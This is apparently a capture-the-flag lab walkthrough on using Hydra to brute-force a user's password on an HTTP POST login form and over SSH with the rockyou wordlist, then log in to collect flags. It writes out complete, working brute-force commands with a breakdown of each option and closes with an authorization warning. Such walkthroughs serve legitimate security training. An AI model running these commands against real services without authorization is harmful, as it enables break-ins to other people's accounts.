# Hydra Basics

## Overview

This guide covers basic Hydra usage for brute-forcing login credentials on HTTP forms and SSH services.

---

## Step 1: Identify the Target

- Navigate to the target IP address.
- Determine what service (e.g., web form, SSH) the credentials are associated with.
- In this case, the target is an **HTTP form**.

---

## Step 2: Trigger an Error Message

- Attempt to log in using incorrect credentials.
- Take note of the **error message** that appears—this will help Hydra recognize failed login attempts.

---

## Step 3: Brute-Force HTTP POST Login with Hydra

Use the following Hydra command for brute-forcing an HTTP POST form:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
```

### Command Breakdown:

- `-l molly` : Single username to use (`molly`)
- `-P /usr/share/wordlists/rockyou.txt` : Path to the password dictionary
- `target_ip` : Target IP address or hostname
- `http-post-form` : Specifies HTTP POST form attack method
- `/login` : Path to the login form
- `username=^USER^` : Placeholder for username
- `password=^PASS^` : Placeholder for password
- `F=Your username or password is incorrect.` : Text of the failure message

> **Note:** Adjust the form path and failure message based on how the web application behaves.

---

## Step 4: Submit the Found Credentials

- After Hydra discovers the correct password, **manually log in** through the HTTP form using the recovered credentials.
- Retrieve the **flag** or any other objective required.

---

## Step 5: Brute-Force SSH Credentials with Hydra

To target an SSH service, use the following Hydra command:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt target_ip ssh
```

### Command Breakdown:

- `-l molly` : Single username (`molly`)
- `-P /usr/share/wordlists/rockyou.txt` : Path to the password dictionary
- `target_ip` : Target IP address or hostname
- `ssh` : Specifies the SSH service

---

## Step 6: Access via SSH

- Once Hydra finds Molly’s SSH password, sign in to the target system using:

```bash
ssh molly@target_ip
```

- Retrieve the **second flag** from the SSH session.

---

> ⚠️ **Warning:**  
Always ensure you have **explicit authorization** before conducting any penetration testing activities. Unauthorized use of these techniques is **illegal** and unethical.
